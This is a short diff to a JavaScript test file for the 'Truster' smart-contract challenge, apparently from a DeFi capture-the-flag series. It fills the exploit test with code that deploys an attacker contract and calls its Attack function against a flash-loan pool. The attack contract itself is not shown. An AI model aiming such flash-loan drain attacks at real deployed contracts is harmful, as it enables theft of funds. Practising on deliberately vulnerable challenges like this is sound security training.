@@ -28,7 +28,11 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
+        /** call truster contract that calls flashLoan with exploit  */
+        const Attacker = await ethers.getContractFactory('TrustAttack', attacker);
+        this.attacker = await Attacker.deploy(this.pool.address, this.token.address);
+        await this.attacker.Attack();
+
     });
 
     after(async function () {
